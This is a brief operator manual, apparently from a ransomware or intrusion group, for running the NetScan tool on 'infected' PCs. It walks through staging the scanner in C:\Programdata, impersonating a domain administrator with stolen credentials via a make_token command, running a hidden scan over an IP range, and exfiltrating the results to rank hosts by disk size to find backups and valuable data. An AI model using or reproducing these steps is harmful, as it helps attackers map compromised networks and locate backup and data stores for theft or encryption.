A great tool is NetScan, which makes it easy to scout and find NAS \ Backup, etc.
Scans networks by range using the credentials of the user / administrator on whose behalf the software was launched.
Returns the following information:
Hostname, Open Ports, Group / Domain Membership, Total Disk Space, Available Shares, Device Manufacturer, PC / Server Role

1) Load the NetScan folder on any infected PC. Let's say 
C:\Programdata\netscan

2) cd C:\programdata\netscan

3) make_token DOMAIN\admin password

4) shell netscan.exe /hide /auto:"result.xml" /config:netscan.xml /range:192.168.0.1-192.168.1.255

We change the ranges to our own, do not touch the rest

5) We are waiting. After completion, the result.xml file will appear in our folder, we download it to our computer

6) We open NetScan on our Windows, load the downloaded file there and see the result in a convenient format.
We sort by disk size, so you will immediately understand where the juice itself is hidden

Special thanks to Perry for helping me find the technical documentation on which this manual is based.
Sonic, you can add NetScan to the algorithm
